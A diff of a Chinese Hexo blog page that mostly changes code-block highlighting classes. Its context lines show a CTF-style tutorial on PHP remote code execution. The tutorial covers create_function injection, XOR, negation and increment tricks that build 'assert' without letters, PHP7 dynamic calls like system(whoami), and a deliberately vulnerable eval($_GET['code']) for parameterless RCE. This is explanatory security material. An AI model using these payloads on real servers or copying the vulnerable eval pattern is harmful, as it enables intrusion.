@@ -68,7 +68,7 @@ exec">
 
 <meta name="generator" content="Hexo 6.3.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+</head>
 
 
     <body>
@@ -457,7 +457,7 @@ exec">
 </ol>
 <p>作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p>
 <p>示例</p>
-<pre class="language-none"><code class="language-none">&lt;?php
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
         $a = $_GET['chybeta'];
         $b = create_function('$a',"echo $a");
         $b('');
@@ -527,7 +527,7 @@ http://localhost:2500/codeexec.php?chybeta=phpinfo</code></pre>
 <p>利用各种非数字字母的字符，经过各种变换（异或、取反、自增），构造出单个的字母字符，然后把单个字符拼接成一个函数名，比如说<code>assert</code>，然后就可以动态执行了。所以说这里的核心就是要将非字母的字符变换成字母字符。</p>
 <h3 id="1-异或"><a href="#1-异或" class="headerlink" title="1.异或 ^"></a>1.异或 ^</h3><p>指的是php按位异或，在php中，两个字符进行异或操作后，得到的依然是<strong>一个字符</strong>，当我们想得到<code>a-z</code>中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成<code>ascii码</code>值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：<code>1^1=0,1^0=1,0^1=1,0^0=0</code>，简单的来说就是<strong>相同为零，不同为一</strong></p>
 <p>因为很多都是不可见的字符，所以说我就先url编码了一下</p>
-<pre class="language-none"><code class="language-none">a:'%40'^'%21' ; s:'%7B'^'%08' ; s:'%7B'^'%08' ; e:'%7B'^'%1E' ; r:'%7E'^'%0C' ; t:'%7C'^'%08'
+<pre class="language-php" data-language="php"><code class="language-php">a:'%40'^'%21' ; s:'%7B'^'%08' ; s:'%7B'^'%08' ; e:'%7B'^'%1E' ; r:'%7E'^'%0C' ; t:'%7C'^'%08'
 P:'%0D'^'%5D' ; O:'%0F'^'%40' ; S:'%0E'^'%5D' ; T:'%0B'^'%5F'
 拼接起来：
 $_=('%40'^'%21').('%7B'^'%08').('%7B'^'%08').('%7B'^'%1E').('%7E'^'%0C').('%7C'^'%08'); //$_=assert
@@ -543,7 +543,7 @@ $_=('%40'^'%21').('%7B'^'%08').('%7B'^'%08').('%7B'^'%1E').('%7E'^'%0C').('%7C'^
 <p>利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>'和'{2}</code>的结果是<code>"\x8c"</code>，其取反即为字母<code>s</code></p>
 <h3 id="3-自增"><a href="#3-自增" class="headerlink" title="3.自增"></a>3.自增</h3><p>只要我们获得了小写字母<code>a</code>，就可以通过自增获得所有小写字母，当我们获得大写字母<code>A</code>，就可以获得所有大写字母了</p>
 <p>数组(Array)中就正好有大写字母<code>A</code>和小写字母<code>a</code>，而在PHP中，如果强制连接数组和字符串的话，数组就会被强制转换成字符串，它的值就为<code>Array</code>，那取它的第一个子母，就拿到<code>A</code>了，那有了<code>a</code>和<code>A</code>，相当于我们就可以拿到<code>a-z</code>和<code>A-Z</code>中的所有字母了</p>
-<pre class="language-none"><code class="language-none">&lt;?php
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
 $_=[];
 $_=@"$_"; // $_='Array';
 $_=$_['!'=='@']; // $_=$_[0];
@@ -575,7 +575,7 @@ $___($_[_]); // ASSERT($_POST[_]);</code></pre>
 
 <p>在php7中，我们可以使用($a)()这种方法来执行命令，如(call_user_func)(system,whoami,’’)</p>
 <p>php7特性</p>
-<pre class="language-none"><code class="language-none">&lt;?php
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
 'var_dump'('1111');
  ("VAR_DUMP")("llll");
  echo $_GET[ss];
@@ -596,13 +596,13 @@ echo `pwd`;</code></pre>
 <p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YWU5MjU2NWQ2MWJmYjU3Zjk5MGY3MTY2Y2Q4YmZiYzZfUENkN3pEbm5MMzU2b0hQWk9NVDhENnlHVlo0R3J3alRfVG9rZW46RUYzd2JmRWt6b2JkRXl4NkFlRGNVQ0tpbmxiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p>
 <p>成功执行任意命令。</p>
 <h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果，这在ctf中也算是一个比较常见的考点，接下来就来详细总结总结它的利用姿势</p>
-<h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><pre class="language-none"><code class="language-none">if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) { 
+<h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><pre class="language-php" data-language="php"><code class="language-php">if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) { 
  eval($_GET['code']);
 }</code></pre>
 
 <p>这段代码的核心就是只允许函数而不允许函数中的参数，就是说传进去的值是一个字符串接一个<code>()</code>，那么这个字符串就会被替换为空，如果替换后只剩下<code>;</code>，那么这段代码就会被<code>eval</code>执行。而且因为这个正则表达式是递归调用的，所以说像<code>a(b(c()));</code>第一次匹配后就还剩下<code>a(b());</code>，第二次匹配后就还剩<code>a();</code>，第三次匹配后就还剩<code>;</code>了，所以说这一串<code>a(b(c()));</code>就会被<code>eval</code>执行，但相反，像<code>a(b('111'));</code>这种存在参数的就不行，因为无论正则匹配多少次它的参数总是存在的。那假如遇到这种情况，我们就只能使用没有参数的php函数，下面就来具体介绍一下：</p>
 <h2 id="1-getallheaders"><a href="#1-getallheaders" class="headerlink" title="1.getallheaders()"></a>1.getallheaders()</h2><p>这个函数的作用是获取<code>http</code>所有的头部信息，也就是<code>headers</code>，然后我们可以用<code>var_dump</code>把它打印出来，但这个有个限制条件就是必须在<code>apache</code>的环境下可以使用，其它环境都是用不了的，我们到burp中去做演示,测试代码如下：</p>
-<pre class="language-none"><code class="language-none">&lt;?php
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
 highlight_file(__FILE__);
 if(isset($_GET['code'])){
 if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) { 
